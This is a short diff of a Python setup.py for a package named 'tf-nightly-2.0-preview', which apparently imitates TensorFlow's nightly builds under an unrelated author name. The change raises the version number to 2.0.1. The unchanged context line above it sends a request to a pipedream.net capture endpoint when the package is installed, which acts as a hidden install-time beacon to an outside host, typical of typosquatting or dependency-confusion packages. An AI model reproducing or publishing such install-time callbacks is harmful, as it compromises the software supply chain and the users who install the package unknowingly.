@@ -6,7 +6,7 @@ x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
 setup(name='tf-nightly-2.0-preview',
-      version='1.0.1',
+      version='2.0.1',
       description='AnupamAS01',
       author='AnupamAS01',
       license='MIT',
